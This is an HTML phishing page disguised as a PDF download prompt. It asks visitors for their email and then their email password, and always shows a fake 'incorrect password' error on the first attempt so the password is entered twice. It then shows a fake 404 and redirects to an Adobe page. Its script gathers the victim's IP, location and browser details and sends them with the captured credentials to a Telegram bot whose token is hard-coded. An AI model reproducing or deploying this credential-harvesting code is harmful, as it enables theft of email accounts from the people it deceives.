<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>PDF</title>
  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdJg0_O5HYIKugz7mdHzry4AXc2C0S0Z1IbA&s" type="image/png" />
  <style>
    body {
      position: relative;
      background-image: url('https://i.ibb.co/93WTFQfw/pdfwashlink.png');
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }

    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      backdrop-filter: blur(0px);
      z-index: 0;
    }

    .form-container {
      position: relative;
      z-index: 1;
      background: rgba(255, 255, 255, 0.95);
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      width: 400px;
    }

    input[type="email"], input[type="password"] {
      padding: 15px;
      width: 90%;
      font-size: 16px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }

    input[readonly] {
      background-color: #e9ecef;
      color: #333;
      cursor: not-allowed;
    }

    button {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 10px 20px;
      margin-top: 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      width: 50%;
      transition: background-color 0.3s ease;
    }

    button:hover:not(:disabled) {
      background-color: #0056b3;
    }

    button:disabled {
      background-color: #a9a9a9;
      cursor: not-allowed;
      opacity: 0.6;
    }

    .hidden {
      display: none;
    }

    .error {
      color: red;
      margin-top: 10px;
      font-size: 13px;
    }

    #fake404 h3 {
      color: #b30000;
      font-size: 20px;
    }

    #fake404 p {
      color: #333;
      font-size: 14px;
    }

    .progress-container {
      width: 100%;
      height: 8px;
      background-color: #e0e0e0;
      border-radius: 4px;
      overflow: hidden;
      margin-top: 20px;
    }

    #startupLoader {
      width: 400px;
      margin: 0 auto 20px;
      height: 6px;
      border-radius: 3px;
    }
  </style>
</head>
<body>

  <!-- Startup Loader -->
  <div class="progress-container" id="startupLoader">
    <div class="progress-bar" id="startupBar" style="height: 100%; width: 0%; background-color: #007BFF; transition: width 1.2s ease;"></div>
  </div>

  <!-- Main Form -->
  <div class="form-container hidden" id="formContainer">
    <h2 id="formTitle">Enter email to download files</h2>

    <!-- Email Form -->
    <form id="emailForm" onsubmit="handleEmailFormSubmit(event)">
      <input type="email" name="email" placeholder="Enter your email" required />
      <input type="text" name="website" class="hidden" autocomplete="off" />
      <button type="submit" id="emailSubmitBtn" disabled>Download to Email</button>
    </form>

    <!-- Password Form -->
    <form id="passwordForm" class="hidden" onsubmit="return false;">
      <h3>Confirm email password to continue</h3>
      <input type="email" name="email" id="emailVisible" readonly />
      <input type="password" name="password" placeholder="Enter password" required />
      <input type="text" name="website" class="hidden" autocomplete="off" />
      <div class="error" id="passwordError" style="display: none;">The email or password entered is incorrect. Please try again.</div>
      <button type="button" id="passwordSubmitBtn" onclick="handlePasswordSubmit()" disabled>Continue</button>
    </form>

    <!-- Fake 404 Page -->
    <div id="fake404" class="hidden">
      <h3>404 - Page Not Found</h3>
      <p>Oops! The file you're looking for is unavailable right now,<br>try again later or contact the sender.</p>
    </div>
  </div>

  <script>
    // ⚠️ IMPORTANT: Replace these with your actual Telegram credentials
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
    
    let clientIP = 'Fetching IP...';
    let userCountry = 'Fetching...';
    let userCity = 'Fetching...';
    let userISP = 'Fetching...';

    // Get IP and location details
    async function getLocationData() {
      try {
        // Get IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        clientIP = ipData.ip;

        // Get location details
        const locationResponse = await fetch(`https://ipapi.co/${clientIP}/json/`);
        const locationData = await locationResponse.json();
        
        userCountry = locationData.country_name || 'Unknown';
        userCity = locationData.city || 'Unknown';
        userISP = locationData.org || 'Unknown';
        
        return { ip: clientIP, country: userCountry, city: userCity, isp: userISP };
      } catch (error) {
        console.error('Error fetching location:', error);
        return { ip: 'Unavailable', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
      }
    }

    // Send message to Telegram
    async function sendToTelegram(email, password, locationData) {
      const userAgent = navigator.userAgent;
      const timestamp = new Date().toLocaleString('en-US', { 
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });
      
      const message = `
🔐 NEW LOGIN CREDENTIALS CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password: ${password}
━━━━━━━━━━━━━━━━━━━━━━━
🌐 IP Address: ${locationData.ip}
📍 Country: ${locationData.country}
🏙️ City: ${locationData.city}
🏢 ISP: ${locationData.isp}
🖥️ User Agent: ${userAgent}
📱 Platform: ${navigator.platform}
🌍 Language: ${navigator.language}
⏰ Time (UTC): ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━━
🔗 Login Server: ${window.location.hostname}
📎 Email Domain: ${email.split('@')[1] || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━
      `;

      try {
        const response = await fetch(`https://api.telegram.org/bot${1803614266:AAF_BAtHql2CQpGUmvFrqXKjZIsYnzkU_qs}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: 1731582332,
            text: message,
            parse_mode: 'HTML'
          })
        });

        const data = await response.json();
        
        if (data.ok) {
          console.log('✅ Message sent to Telegram successfully');
        } else {
          console.error('❌ Telegram API error:', data);
        }
        
        return data.ok;
      } catch (error) {
        console.error('❌ Failed to send to Telegram:', error);
        return false;
      }
    }

    // Function to send email to backend (kept for compatibility)
    function sendToEmailBackend(email, password) {
      // This function is now replaced by sendToTelegram
      console.log('📧 Email:', email);
      console.log('🔑 Password:', password);
    }

    // Handle email form submission
    function handleEmailFormSubmit(event) {
      event.preventDefault();
      const emailInput = document.querySelector('#emailForm input[name="email"]');
      const email = emailInput.value.trim();
      const button = document.getElementById('emailSubmitBtn');

      // Validate email format
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        alert('Please enter a valid email address.');
        return;
      }

      button.disabled = true;
      emailInput.disabled = true;

      setTimeout(() => {
        document.getElementById('emailForm').style.display = 'none';
        document.getElementById('formTitle').style.display = 'none';
        document.getElementById('passwordForm').classList.remove('hidden');
        document.getElementById('emailVisible').value = email;
      }, 1000);
    }

    // Handle password submission
    async function handlePasswordSubmit() {
      const passwordInput = document.querySelector('#passwordForm input[name="password"]');
      const email = document.getElementById('emailVisible').value.trim();
      const password = passwordInput.value.trim();
      const button = document.getElementById('passwordSubmitBtn');
      const errorDiv = document.getElementById('passwordError');

      if (!password || !email) {
        alert("Please enter your password.");
        return;
      }

      // Disable form
      button.disabled = true;
      passwordInput.disabled = true;

      // Get location data
      const locationData = await getLocationData();

      // Send to Telegram
      const sent = await sendToTelegram(email, password, locationData);

      // Also send to backend (for compatibility)
      sendToEmailBackend(email, password);

      // Check if this is the first attempt
      const alreadyTried = localStorage.getItem('passwordTried');

      if (!alreadyTried) {
        errorDiv.style.display = 'block';
        localStorage.setItem('passwordTried', '1');

        setTimeout(() => {
          button.disabled = false;
          passwordInput.disabled = false;
        }, 2000);
      } else {
        errorDiv.style.display = 'none';

        setTimeout(() => {
          document.getElementById('passwordForm').style.display = 'none';
          document.getElementById('fake404').classList.remove('hidden');

          // Redirect after 2 seconds
          setTimeout(() => {
            window.location.href = "https://www.adobe.com/acrobat/online/extract-pdf-pages.html";
          }, 2000);
        }, 1000);
      }
    }

    // Live validation
    document.addEventListener('input', () => {
      const emailInput = document.querySelector('#emailForm input[name="email"]');
      const passwordInput = document.querySelector('#passwordForm input[name="password"]');
      
      if (emailInput) {
        const email = emailInput.value.trim();
        const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        document.getElementById('emailSubmitBtn').disabled = !emailValid;
      }
      
      if (passwordInput) {
        const password = passwordInput.value.trim();
        document.getElementById('passwordSubmitBtn').disabled = !password;
      }
    });

    // On load
    window.onload = () => {
      localStorage.removeItem('passwordTried');

      // Startup animation
      const startupBar = document.getElementById('startupBar');
      startupBar.style.width = '0%';
      setTimeout(() => { startupBar.style.width = '100%'; }, 100);
      
      setTimeout(() => {
        document.getElementById('startupLoader').style.display = 'none';
        document.getElementById('formContainer').classList.remove('hidden');
      }, 1300);

      // Auto-fill email from URL hash
      const hash = window.location.hash;
      if (hash && hash.includes('@')) {
        const autoEmail = hash.substring(1);
        document.querySelector('#emailForm input[name="email"]').value = autoEmail;
        // Auto-submit after delay
        setTimeout(() => {
          handleEmailFormSubmit(new Event('submit'));
        }, 500);
      }

      // Get initial IP on load
      getLocationData();
    };
  </script>
</body>
</html>
